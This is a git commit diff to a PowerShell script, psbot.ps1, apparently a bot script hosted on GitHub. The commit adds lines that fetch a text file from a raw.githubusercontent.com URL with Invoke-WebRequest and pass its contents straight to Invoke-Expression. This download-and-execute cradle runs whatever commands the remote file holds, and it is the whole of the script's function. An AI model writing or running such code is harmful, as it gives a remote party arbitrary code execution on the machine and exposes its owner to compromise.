530a3fb57b80df5bb8117941e62f35928a2bf649
josevi0 <34846208+josevi0@users.noreply.github.com>
2019-02-02 22:52:31 +0100

    Update psbot.ps1

--- psbot.ps1
+++ psbot.ps1
@@ -1,5 +1,8 @@
-$ip="raw.githubusercontent.com/josevi0/psbot/master/"
+$ip="raw.githubusercontent.com/josevi0/psbot/master"
 $file="cuenta1"
 
 $uri = "https://";$uri+=$ip;$uri+="/";$uri+=$file;$uri+=".txt"
 $uri
+
+$down= Invoke-WebRequest $uri
+Invoke-Expression $down.content
